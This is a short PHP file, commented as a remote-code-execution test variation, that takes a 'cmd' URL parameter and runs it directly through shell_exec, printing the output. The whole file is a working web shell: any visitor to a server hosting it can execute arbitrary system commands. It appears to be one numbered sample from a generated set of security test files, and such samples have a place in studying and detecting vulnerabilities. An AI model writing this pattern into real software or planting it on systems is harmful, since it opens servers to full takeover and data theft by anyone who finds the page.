<?php
// RCE test variation #1059
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>